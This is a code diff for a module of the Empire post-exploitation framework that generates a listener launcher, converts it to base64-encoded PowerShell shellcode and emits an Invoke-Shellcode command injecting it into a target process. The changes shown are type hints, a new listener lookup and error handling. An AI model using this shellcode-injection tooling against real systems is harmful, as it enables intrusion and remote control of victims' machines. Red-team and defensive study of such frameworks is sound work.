@@ -1,6 +1,5 @@
-from typing import Dict
-
 from empire.server.common import helpers
+from empire.server.common.empire import MainMenu
 from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
@@ -8,9 +7,9 @@ from empire.server.utils.module_util import handle_error_message
 class Module:
     @staticmethod
     def generate(
-        main_menu,
+        main_menu: MainMenu,
         module: EmpireModule,
-        params: Dict,
+        params: dict,
         obfuscate: bool = False,
         obfuscation_command: str = "",
     ):
@@ -32,7 +31,7 @@ class Module:
         if err:
             return handle_error_message(err)
 
-        if not main_menu.listeners.is_listener_valid(listener_name):
+        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
             # not a valid listener, return nothing for the script
             return handle_error_message(f"[!] Invalid listener: {listener_name}")
         else:
@@ -50,9 +49,12 @@ class Module:
                 return handle_error_message("[!] Error in launcher generation.")
             else:
                 launcher_code = launcher.split(" ")[-1]
-                sc = main_menu.stagers.generate_powershell_shellcode(
+                sc, err = main_menu.stagers.generate_powershell_shellcode(
                     launcher_code, arch
                 )
+                if err:
+                    return handle_error_message(err)
+
                 encoded_sc = helpers.encode_base64(sc)
 
         script_end = '\nInvoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String("{}")) -Force'.format(
